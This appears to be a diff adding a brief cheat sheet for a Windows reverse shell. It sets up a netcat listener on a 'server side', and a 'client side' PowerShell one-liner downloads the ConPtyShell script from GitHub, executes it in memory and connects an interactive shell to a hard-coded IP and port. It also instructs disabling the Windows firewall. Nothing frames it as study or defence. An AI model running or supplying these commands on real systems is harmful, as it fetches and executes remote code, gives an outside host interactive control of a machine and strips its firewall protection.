@@ -1,0 +1,5 @@
+###server side
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+###make sure to disable firewall in windows
+###client side (enter the ip of the server side)
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.17.211.249 3001
